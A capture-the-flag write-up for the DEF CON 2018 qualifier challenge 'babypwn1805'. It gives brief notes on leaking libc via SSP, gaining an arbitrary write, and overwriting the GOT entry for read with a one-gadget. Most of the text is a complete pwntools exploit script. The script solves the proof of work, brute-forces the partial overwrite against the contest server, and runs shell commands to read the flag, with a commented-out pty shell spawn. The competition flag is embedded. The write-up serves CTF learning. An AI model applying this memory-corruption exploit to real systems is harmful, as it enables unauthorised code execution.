# babypwn1805 - pwn
## Team: BFS
## Ranking: 22
* Overwrite the pointer of program name, and trigger `SSP` -> leak information.
* Get serveral `libc`.
```c
    char asdf[1024];
    long long index = 0;
    read(0, asdf+index, 8);
```
* `asdf+index` -> write everywhere.
* Overwite `GOT read` with `onegadget` -> with probability 1/16 (correct libc).
* `/opt/ctf/babypwn/home/flag`.
```python
#!/usr/bin/env python
from pwn import *
import sys
import struct
import hashlib
import random
from threading import Timer

# OOO{to_know_the_libc_you_must_become_the_libc}

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1


def hit():
    cmd = 'id;LD_PRELOAD='';'
    cmd += 'cat /opt/ctf/babypwn/home/flag;'
    cmd += 'ls -al /opt/ctf/babypwn/home/;'
    cmd += 'source /opt/ctf/babypwn/flag.txt 2>&1;'
    #cmd += 'python -c \'import pty; pty.spawn("/bin/bash")\''
    y.sendline( cmd )
    print y.recv( 2048 )


host , port = 'e4771e24.quals2018.oooverflow.io' , 31337
y = remote( host , port )

y.recvuntil( ': ' )
challenge = y.recvline().strip()
y.recvuntil( ': ' )
n = int( y.recvline() )
y.sendlineafter( ':' , str( solve_pow(challenge, n) ) )

success( 'Go' )

t = 0.3
y.recvuntil( 'Go\n' )

for i in xrange( 0x10000 ):
    y.send( p64( 0xffffffffffffffc8 ) )
    p = 0xae77
    y.send( p16( p ) )
    t = Timer(1.0, hit)
    t.start()
    y.recvuntil( 'Go' , timeout=1 )
    t.cancel()
```